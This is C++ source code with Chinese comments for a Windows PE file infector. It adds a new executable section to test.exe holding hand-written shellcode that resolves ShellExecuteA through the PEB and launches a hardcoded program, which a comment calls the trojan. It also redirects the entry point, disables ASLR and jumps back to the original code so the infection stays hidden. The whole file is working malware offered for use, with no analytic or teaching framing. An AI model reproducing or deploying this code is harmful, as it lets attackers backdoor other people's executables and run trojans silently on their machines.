#include <Windows.h>

unsigned char shellcode[] = { 0x33,0xC9,0x64,0x8B,0x41,0x30,0x8B,
0x40,0x0C,0x8B,0x70,0x14,0xAD,0x96,0xAD,0x8B,0x58,0x10,0x8B,0x53,
0x3C,0x03,0xD3,0x8B,0x52,0x78,0x03,0xD3,0x8B,0x72,0x20,0x03,0xF3,
0x33,0xC9,0x41,0xAD,0x03,0xC3,0x81,0x38,0x47,0x65,0x74,0x50,0x75,
0xF4,0x81,0x78,0x04,0x72,0x6F,0x63,0x41,0x75,0xEB,0x81,0x78,0x08,
0x64,0x64,0x72,0x65,0x75,0xE2,0x8B,0x72,0x24,0x03,0xF3,0x66,0x8B,
0x0C,0x4E,0x49,0x8B,0x72,0x1C,0x03,0xF3,0x8B,0x14,0x8E,0x03,0xD3,
0x33,0xC9,0x53,0x52,0x51,0x68,0x61,0x72,0x79,0x41,0x68,0x4C,0x69,
0x62,0x72,0x68,0x4C,0x6F,0x61,0x64,0x54,0x53,0xFF,0xD2,0x83,0xC4,
0x0C,0x59,0x50,0x33,0xC0,0xB8,0x64,0x6C,0x6C,0x23,0x50,0x83,0x6C,
0x24,0x03,0x23,0x68,0x6C,0x33,0x32,0x2E,0x68,0x53,0x68,0x65,0x6C,
0x54,0xFF,0x54,0x24,0x10,0x83,0xC4,0x0C,0x50,0x33,0xC0,0xB0,0x41,
0x50,0x68,0x63,0x75,0x74,0x65,0x68,0x6C,0x45,0x78,0x65,0x68,0x53,
0x68,0x65,0x6C,0x54,0xFF,0x74,0x24,0x14,0xFF,0x54,0x24,0x20,0x83,
0xC4,0x10,0x50,0x6A,0x05,0x6A,0x00,0x6A,0x00,0x68,0xDA,0x10,0x40,
0x00,0x68,0xD5,0x10,0x40,0x00,0x6A,0x00,0xFF,0x54,0x24,0x18,0x83,
0xC4,0x38,0xE9,0x2B,0xFF,0xFF,0xFF,0x6F,0x70,0x65,0x6E,0x00 };
unsigned char jmpOldOep[] = { 0xE9, 0x00, 0x00, 0x00, 0x00 };

//对齐粒度
DWORD Aligment(DWORD dwSize, DWORD dwAlig)
{
	return (dwSize%dwAlig == 0) ? dwSize : (dwSize / dwAlig + 1)*dwAlig;
}

void main()
{
	HANDLE hFile = CreateFileA("test.exe", FILE_GENERIC_READ | FILE_GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE == hFile)
	{
		CloseHandle(hFile);
		return;
	}
	int filesize = GetFileSize(hFile, NULL);
	char* lpMemory = new char[filesize];
	DWORD RSize = 0;
	ReadFile(hFile, lpMemory, filesize, &RSize, NULL);
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpMemory;    //获取DOS头
	PIMAGE_NT_HEADERS pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)lpMemory + pDosHeader->e_lfanew); //获取NT头
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE || pNTHeader->Signature != IMAGE_NT_SIGNATURE)  //判断PE
	{
		delete[] lpMemory;
		return;
	}
	PIMAGE_FILE_HEADER pFileHeader = (PIMAGE_FILE_HEADER)&pNTHeader->FileHeader;  //通过NT头获取文件头
	if (pNTHeader->FileHeader.Characteristics & IMAGE_FILE_DLL)
	{
		delete[] lpMemory;
		CloseHandle(hFile);
	}
	PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER)&pNTHeader->OptionalHeader; //通过NT头获取可选文件头
	PIMAGE_SECTION_HEADER pFirstSectiongHeader = IMAGE_FIRST_SECTION(pNTHeader);  //通过NT头获取第一个节表头
	int sectionNum = pFileHeader->NumberOfSections++;                             //节表数加一
	PIMAGE_SECTION_HEADER pLastSectionHeader = pFirstSectiongHeader + sectionNum; //通过第一个节表头获取新加的一个节表头
	DWORD dwFileAlig = pOptionalHeader->FileAlignment;
	DWORD dwMemAlig = pOptionalHeader->SectionAlignment;
	memcpy(pLastSectionHeader->Name, ".code", 7);
	pLastSectionHeader->Misc.VirtualSize = sizeof(shellcode);
	pLastSectionHeader->SizeOfRawData = Aligment(sizeof(shellcode), dwFileAlig);
	pLastSectionHeader->VirtualAddress = (pLastSectionHeader - 1)->VirtualAddress + Aligment((pLastSectionHeader - 1)->SizeOfRawData, dwMemAlig);  //虚拟偏移
	pLastSectionHeader->PointerToRawData = Aligment((pLastSectionHeader - 1)->PointerToRawData + (pLastSectionHeader - 1)->Misc.VirtualSize, dwFileAlig); //文件偏移
	pLastSectionHeader->Characteristics = 0xE0000060;
	pOptionalHeader->SizeOfImage = Aligment(pLastSectionHeader->VirtualAddress + pLastSectionHeader->SizeOfRawData, dwMemAlig);
	//去掉随机基址
	pOptionalHeader->DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
	//修改入口点
	DWORD oldOep = pOptionalHeader->AddressOfEntryPoint;
	DWORD jmpOffest = oldOep - (pLastSectionHeader->VirtualAddress + 0xCC) - sizeof(jmpOldOep);
	pOptionalHeader->AddressOfEntryPoint = pLastSectionHeader->VirtualAddress;
	*(DWORD*)&jmpOldOep[1] = jmpOffest;
	//修改文件,填入shellcode
	int newFileSize = pLastSectionHeader->PointerToRawData + pLastSectionHeader->SizeOfRawData;
	char* pNewFile = new char[newFileSize];
	ZeroMemory(pNewFile, newFileSize);
	memcpy(pNewFile, lpMemory, pLastSectionHeader->PointerToRawData);
	memcpy(pNewFile + pLastSectionHeader->PointerToRawData, shellcode, sizeof(shellcode));
	//填入自己的路径，也就是木马的路径
	char path[MAX_PATH] = "C:\\Users\\sunman\\Desktop\\TTHexEdit.exe";
	//GetModuleFileNameA(NULL, path, MAX_PATH);
	memcpy(pNewFile + pLastSectionHeader->PointerToRawData + sizeof(shellcode), path, strlen(path) + 1);
	//填入路径的地址偏移
	DWORD pathaddr = pLastSectionHeader->VirtualAddress + pOptionalHeader->ImageBase + sizeof(shellcode);
	memcpy(pNewFile + pLastSectionHeader->PointerToRawData + 0xBA, &pathaddr, 4);
	//填入open的地址偏移
	DWORD openaddr = pLastSectionHeader->VirtualAddress + pOptionalHeader->ImageBase + 0xD1;
	memcpy(pNewFile + pLastSectionHeader->PointerToRawData + 0xBF, &openaddr, 4);
	//填补跳转指令
	memcpy(pNewFile + pLastSectionHeader->PointerToRawData + 0xCC, jmpOldOep, sizeof(jmpOldOep));
	//写出文件
	SetFilePointer(hFile, 0, 0, FILE_BEGIN);
	DWORD dwWrite = 0;
	WriteFile(hFile, pNewFile, newFileSize, &dwWrite, NULL);
	CloseHandle(hFile);
	delete[] pNewFile;
	delete[] lpMemory;
}

